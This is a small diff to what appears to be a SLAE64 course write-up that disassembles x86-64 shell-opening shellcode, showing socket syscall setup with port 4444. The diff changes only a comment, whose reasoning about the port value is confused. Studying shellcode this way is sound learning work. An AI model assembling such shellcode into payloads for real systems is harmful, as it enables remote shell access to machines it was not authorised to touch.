@@ -161,7 +161,7 @@ whitecr0wz@SLAE64:~/assembly/assignments/Assignment_5/dissect2$ echo -ne "\x6A\x
 0000000A  0F05              syscall                           ; Executes the syscall.
 0000000C  4897              xchg rax,rdi                      ; Exchanges the value between RAX and RDI. This saves the value in RDI for sockfd operations.
 0000000E  52                push rdx                          ; Pushes the value of RDX. As it is a NULL, the NULL-DWORD is pushed as a 0, which is an argument of the const struct addr.
-0000000F  C704240200115C    mov dword [rsp],0x5c110002        ; Pushes 4444 in hex into the stack. However, as 4444 is not small enough for RSP, a few NULLs are parsed.
+0000000F  C704240200115C    mov dword [rsp],0x5c110002        ; Pushes 4444 in hex into the stack. However, as 4444 is not big enough for RSP, a few NULLs are parsed.
 00000016  4889E6            mov rsi,rsp                       ; The value of RSP is copied into RSI.
 00000019  6A10              push byte +0x10                   ; The value "16" is pushed into the stack.
 0000001B  5A                pop rdx                           ; Pops this value into RDX. This satisfies the length argument.
